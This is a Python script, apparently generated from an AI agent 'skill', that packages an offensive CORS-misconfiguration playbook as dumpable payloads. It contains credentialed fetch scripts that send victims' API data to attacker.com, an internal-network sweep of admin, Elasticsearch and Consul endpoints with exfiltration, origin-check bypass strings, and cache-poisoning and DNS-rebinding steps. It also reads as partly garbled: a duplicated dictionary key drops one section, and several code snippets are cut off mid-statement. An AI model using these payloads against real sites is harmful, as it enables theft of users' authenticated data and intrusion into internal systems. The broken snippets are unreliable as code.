#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/cors-cross-origin-misconfiguration

Skill: SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors
Desc : >-

Run:  python hack-skills-cors-cross-origin-misconfiguration.py --help
      python hack-skills-cors-cross-origin-misconfiguration.py --list
      python hack-skills-cors-cross-origin-misconfiguration.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/cors-cross-origin-misconfiguration'
TITLE = 'SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: cors-cross-origin-misconfiguration", "description: >-", "CORS misconfiguration testing playbook. Use when analyzing cross-origin trust, credentialed browser reads, origin reflection, preflight policy bugs, and browser-based access to authenticated APIs."],
    'skill-cors-misconfiguration-credentialed-origins-reflection-and-trust-boundary-errors': [],
    'extended-scenarios': ["Also load [SCENARIOS.md](./SCENARIOS.md) when you need:", "- JSONP hijacking complete attack scenario \u2014 watering hole + `<script>` cross-origin data theft", "- Honeypot de-anonymization via JSONP \u2014 use social platform JSONP endpoints to identify anonymous visitors", "- Same-origin policy deep dive \u2014 protocol/hostname/port definition, `document.domain` subdomain relaxation and its security risks", "- CORS vs JSONP technical comparison \u2014 methods, error handling, credential behavior, migration path", "- CORS exploitation payloads \u2014 reflected origin with `credentials: include`, null origin via sandboxed iframe", "- Dual-site attack lab pattern \u2014 localhost:8981 (target) + localhost:8982 (attacker) testing setup"],
    '1-when-to-load-this-skill': ["Load when:", "- Responses contain `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or preflight headers", "- A browser-based attack path might read authenticated API responses", "- JSON endpoints appear protected from CSRF but are readable cross-origin"],
    '2-high-value-misconfiguration-checks': [],
    '3-quick-triage': ["1. Send crafted `Origin` headers and inspect reflection.", "2. Test with and without credentials.", "3. Probe allowlist bypasses using attacker subdomains and parser edge cases.", "4. If readable data is sensitive, chain to account or tenant impact."],
    '4-related-routes': ["- Session or JSON action abuse: [csrf cross site request forgery](../csrf-cross-site-request-forgery/SKILL.md)", "- OAuth token leakage and callback binding: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)", "- API auth context: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)"],
    '5-null-origin-exploitation': [],
    'how-origin-null-is-sent': [],
    'exploitation': ["If the server includes `null` in its origin allowlist or reflects it:", "```http", "Access-Control-Allow-Origin: null", "Access-Control-Allow-Credentials: true", "```html", "<iframe sandbox=\"allow-scripts allow-forms\" srcdoc=\"", "<script>", "fetch('https://target.com/api/user/profile', {credentials: 'include'})", ".then(r => r.json())", ".then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))));", "</script>", "\"></iframe>", "The sandboxed iframe sends `Origin: null` \u2192 server reflects `null` \u2192 attacker reads credentialed response."],
    '6-subdomain-xss-cors-bypass-chain': [],
    'attack-flow': ["```text", "1. Target API at api.target.com allows CORS from *.target.com", "2. Find XSS on any subdomain: blog.target.com, dev.target.com, etc.", "3. Exploit XSS to make credentialed requests to api.target.com", "4. CORS allows the request \u2192 attacker reads sensitive API responses"],
    'poc-injected-via-xss-on-blog-target-com': ["```javascript", "fetch('https://api.target.com/v1/user/profile', {", "credentials: 'include'", ".then(r => r.json())", ".then(data => {", "navigator.sendBeacon('https://attacker.com/exfil',", "JSON.stringify(data));"],
    'why-this-works': ["- `blog.target.com` is **same-site** with `api.target.com` \u2192 `SameSite` cookies sent", "- CORS allowlist includes `*.target.com` \u2192 `Access-Control-Allow-Origin: https://blog.target.com`", "- Combined: SameSite bypass + CORS read = full API access from XSS on any subdomain"],
    'reconnaissance-for-this-chain': ["```text", "\u25a1 Enumerate subdomains (amass, subfinder, crt.sh)", "\u25a1 Test each for XSS (stored, reflected, DOM)", "\u25a1 Check if API CORS accepts subdomain origins", "\u25a1 Subdomain takeover candidates also qualify"],
    '7-vary-origin-caching-issue': [],
    'problem': ["When the server reflects `Origin` in `Access-Control-Allow-Origin` but does **not** include `Vary: Origin` in the response, intermediary caches (CDN, reverse proxy) may serve the same cached response to different origins:", "```text", "1. Attacker requests: Origin: https://attacker.com", "Response cached with: Access-Control-Allow-Origin: https://attacker.com", "2. Victim requests same URL (no Origin or different Origin)", "Cache serves response with: Access-Control-Allow-Origin: https://attacker.com", "\u2192 Victim's browser allows attacker.com to read the response (CORS cache poisoning)"],
    'detection': ["```bash"],
    'request-1-with-attacker-origin': ["curl -H \"Origin: https://evil.com\" https://target.com/api/data -I"],
    'request-2-with-legitimate-origin': ["curl -H \"Origin: https://target.com\" https://target.com/api/data -I"],
    'compare-if-both-responses-have-access-control-allow-origin-https-evil-com': [],
    'cache-poisoned-vary-origin-is-missing': [],
    'exploitation': ["```text", "1. Warm the cache: send request with Origin: https://attacker.com", "2. Wait for victim to access the same cached URL", "3. Cached ACAO header allows attacker.com to read the response", "4. Attacker page fetches the URL \u2192 reads cached response with credentials"],
    'fix-verification': ["```text", "\u25a1 Response includes Vary: Origin", "\u25a1 Cache key includes the Origin header", "\u25a1 Alternatively: Access-Control-Allow-Origin is not reflected (hardcoded allowlist)"],
    '8-regex-bypass-patterns': ["Common flawed regex patterns for origin validation:"],
    'test-payloads-for-origin-validation-bypass': ["```text", "https://attacker.com/.target.com", "https://target.com.attacker.com", "https://attackertarget.com", "https://target.com%60attacker.com", "https://target.com%2F@attacker.com", "https://attacker.com#.target.com", "https://attacker.com?.target.com"],
    'advanced-unicode-normalization-bypass': ["```text", "https://target.com \u2192 https://\u24e3arget.com (Unicode homoglyph)", "Some origin validators normalize Unicode after comparison, while the browser sends the original \u2014 or vice versa."],
    '9-internal-network-cors-exploitation': [],
    'scenario': ["An internal-only API (e.g., `http://192.168.1.100:8080/admin`) is configured with:", "```http", "Access-Control-Allow-Origin: *", "Internal APIs often use wildcard CORS because \"only internal users can reach it.\""],
    'attack-chain': ["```text", "1. Attacker sends victim (internal employee) a link to attacker.com", "2. Attacker page JavaScript fetches internal API:", "fetch('http://192.168.1.100:8080/admin/users')", "3. CORS allows * \u2192 response readable", "4. Exfiltrate internal data to attacker server", "```javascript", "// On attacker.com \u2014 target internal API from victim's browser", "const internalAPIs = [", "'http://192.168.1.1/admin/config',", "'http://10.0.0.1:8080/api/users',", "'http://172.16.0.1:9200/_cat/indices',  // Elasticsearch", "'http://localhost:8500/v1/agent/members', // Consul", "internalAPIs.forEach(url => {", "fetch(url)", ".then(r => r.text())", ".then(data => {", "navigator.sendBeacon('https://attacker.com/exfil',", "JSON.stringify({url, data}));", ".catch(() => {});"],
    'port-scanning-via-cors-timing': ["Even without `Access-Control-Allow-Origin: *`, the attacker can infer internal service availability:", "- **Port open**: connection established \u2192 CORS error (different timing)", "- **Port closed**: connection refused \u2192 fast error", "- **Host down**: timeout \u2192 slow error"],
    'combined-with-dns-rebinding': ["```text", "1. Attacker controls attacker.com with short TTL (e.g., 0 or 1)", "2. First DNS resolution: attacker.com \u2192 attacker's IP (serves malicious JS)", "3. Second DNS resolution: attacker.com \u2192 192.168.1.100 (internal IP)", "4. JavaScript on the page fetches attacker.com/admin \u2192 now hits internal server", "5. Same-origin policy satisfied (same domain) \u2192 response readable"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()